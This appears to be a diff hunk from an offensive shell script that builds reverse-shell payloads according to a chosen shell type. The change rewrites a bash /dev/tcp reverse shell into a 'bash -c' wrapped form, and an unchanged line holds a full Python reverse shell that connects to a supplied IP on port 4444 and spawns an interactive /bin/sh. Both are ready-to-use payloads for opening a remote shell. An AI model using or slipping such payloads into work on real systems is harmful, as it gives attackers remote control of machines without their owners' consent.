@@ -309,7 +309,7 @@ do
 			read shell_type
 			if [ "$shell_type" = "bash" ]
 			then
-    				rev_shell="bash -i >& /dev/tcp/$ip_address/4444 0>&1"
+    				rev_shell="bash -c \"/bin/bash -i >& /dev/tcp/$ip_address/4444 0>&1\""
 			elif [ "$shell_type" = "python" ]
 			then
 				rev_shell="python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip_address\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
